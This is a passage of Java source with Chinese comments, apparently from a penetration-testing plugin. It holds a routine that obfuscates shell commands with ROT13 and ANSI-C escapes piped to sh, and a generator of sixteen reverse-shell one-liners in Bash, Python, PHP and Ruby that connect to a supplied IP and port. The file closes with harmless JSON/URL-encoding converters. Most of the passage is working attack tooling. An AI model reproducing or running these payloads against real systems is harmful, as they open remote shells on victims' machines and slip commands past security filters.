                rot13Encoded.append((char) ('a' + (c - 'a' + 13) % 26));
            } else if (c >= 'A' && c <= 'Z') {
                rot13Encoded.append((char) ('A' + (c - 'A' + 13) % 26));
            } else {
                rot13Encoded.append(c);
            }
        }
        command_Bypass_3 += "echo " + rot13Encoded.toString() + " | tr 'A-Za-z' 'N-ZA-Mn-za-m' | sh";
        command_Bypass_3 += "\n或者\n`echo " + rot13Encoded.toString() + " | tr 'A-Za-z' 'N-ZA-Mn-za-m'`";

        // ANSI-C 转义字符
        String command_Bypass_4 = " ANSI-C 转义字符:\n";
        StringBuilder ansiCEncoded = new StringBuilder("$'");
        for (char c : command.toCharArray()) {
            ansiCEncoded.append(String.format("\\x%02x", (int) c));
        }
        ansiCEncoded.append("'");
        command_Bypass_4 += "echo " + ansiCEncoded.toString() + " | sh";
        command_Bypass_4 += "\n或者\n`echo " + ansiCEncoded.toString() + "`";

        // 返回包含四种混淆命令的数组
        String[] command_Bypass_list = {command_Bypass_1, command_Bypass_2, command_Bypass_3, command_Bypass_4};
        return command_Bypass_list;
    }

    //反弹shell生成
    private String[] reverse_shell(String ip,String port){
        //Bash TCP
        String reverse_shell_1 = "bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1";
        String reverse_shell_2 = "/bin/bash -i > /dev/tcp/"+ip+"/"+port+" 0<& 2>&1";
        String reverse_shell_3 = "exec 5<>/dev/tcp/"+ip+"/"+port+";cat <&5 | while read line; do $line 2>&5 >&5; done";
        String reverse_shell_4 = "exec /bin/sh 0</dev/tcp/"+ip+"/"+port+" 1>&0 2>&0";
        String reverse_shell_5 = "0<&196;exec 196<>/dev/tcp/"+ip+"/"+port+"; sh <&196 >&196 2>&196";

        //Bash UDP
        String reverse_shell_6 = "sh -i >& /dev/udp/"+ip+"/"+port+" 0>&1";
        String reverse_shell_7 = "nc -u -lvp "+port;

        //Python
        String reverse_shell_8 = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ip+"\","+port+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
        String reverse_shell_9 = "export RHOST=\""+ip+"\";export RPORT="+port+";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'";
        String reverse_shell_10 = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ip+"\","+port+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'";

        //PHP
        String reverse_shell_11 = "php -r '$sock=fsockopen(\""+ip+"\","+port+");exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
        String reverse_shell_12 = "php -r '$s=fsockopen(\""+ip+"\","+port+");$proc=proc_open(\"/bin/sh -i\", array(0=>$s, 1=>$s, 2=>$s),$pipes);'";
        String reverse_shell_13 = "php -r '$s=fsockopen(\""+ip+"\","+port+");shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
        String reverse_shell_14 = "php -r '$s=fsockopen(\""+ip+"\","+port+");system(\"/bin/sh -i <&3 >&3 2>&3\");'";

        //Ruby
        String reverse_shell_15 = "ruby -rsocket -e'f=TCPSocket.open(\""+ip+"\","+port+").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'";
        String reverse_shell_16 = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\""+ip+"\",\""+port+"\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'";

        String[] reverse_shell_list ={reverse_shell_1,reverse_shell_2,reverse_shell_3,reverse_shell_4,reverse_shell_5,reverse_shell_6,reverse_shell_7,reverse_shell_8,reverse_shell_9,reverse_shell_10,reverse_shell_11,reverse_shell_12,reverse_shell_13,reverse_shell_14,reverse_shell_15,reverse_shell_16};
        return reverse_shell_list;
    }

    // 参数/json格式 互转
    private String convert_data(String stringData) {
        try {
            if (isJson(stringData)) {
                return jsonToUrlEncoded(stringData);
            } else {
                return urlEncodedToJson(stringData);
            }
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
            return "格式错误";
        }
    }

    // 简单判断是否为 JSON 格式
    private boolean isJson(String string) {

        return string.trim().startsWith("{") && string.trim().endsWith("}");
    }

    // 手动解析 JSON 字符串
    private String jsonToUrlEncoded(String jsonString) throws UnsupportedEncodingException {

        jsonString = jsonString.trim().substring(1, jsonString.length() - 1); // 去掉大括号
        StringBuilder urlEncodedString = new StringBuilder();
        String[] pairs = jsonString.split(",");

        for (String pair : pairs) {
            String[] keyValue = pair.split(":", 2);
            String key = keyValue[0].trim().replaceAll("^\"|\"$", ""); // 去掉引号
            String value = keyValue[1].trim().replaceAll("^\"|\"$", ""); // 去掉引号

            if (urlEncodedString.length() > 0) {
                urlEncodedString.append("&");
            }
            urlEncodedString.append(URLEncoder.encode(key, "UTF-8"))
                    .append("=")
                    .append(URLEncoder.encode(value, "UTF-8"));
        }

        return urlEncodedString.toString();
    }

    // 手动构建 JSON 字符串
    private String urlEncodedToJson(String urlEncodedString) throws UnsupportedEncodingException {

        StringBuilder jsonString = new StringBuilder("{");
        String[] pairs = urlEncodedString.split("&");

        for (int i = 0; i < pairs.length; i++) {
            String pair = pairs[i];
            String[] keyValue = pair.split("=", 2);
            String key = URLDecoder.decode(keyValue[0], "UTF-8");
            String value = (keyValue.length > 1) ? URLDecoder.decode(keyValue[1], "UTF-8") : "";

            jsonString.append("\"").append(key).append("\":\"").append(value).append("\"");
            if (i < pairs.length - 1) {
                jsonString.append(",");
            }
        }

        jsonString.append("}");
        return jsonString.toString();
    }

}
